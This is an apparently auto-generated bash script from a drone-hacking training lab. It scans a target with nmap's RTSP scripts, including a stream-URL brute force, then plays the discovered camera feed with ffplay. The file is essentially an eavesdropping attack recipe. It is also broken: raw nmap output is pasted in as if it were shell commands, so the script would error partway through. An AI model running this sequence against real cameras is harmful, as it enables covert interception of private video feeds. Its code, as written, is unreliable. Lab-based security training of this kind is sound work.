#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Camera-Feed-Eavesdropping.md
# Created: 2025-11-23 16:46:38
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=camera-feed-eavesdropping src=Camera-Feed-Eavesdropping.md"
log "[BLOCK 1] type=shell"
nmap ${TARGET_CC} --script rtsp*

log "[BLOCK 2] type=shell"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 20:39 EDT
Nmap scan report for ${TARGET_CC}
Host is up (0.000092s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
${PORT_RTSP}/tcp  open  rtsp
|_rtsp-methods: OPTIONS, DESCRIBE, ANNOUNCE, GET_PARAMETER, PAUSE, PLAY, RECORD, SETUP, SET_PARAMETER, TEARDOWN
| rtsp-url-brute: 
|   discovered: 
|_    rtsp://${TARGET_CC}/stream1
${PORT_WEB}/tcp open  ppp

log "[BLOCK 3] type=shell"
ffplay rtsp://${TARGET_CC}:${PORT_RTSP}/stream1

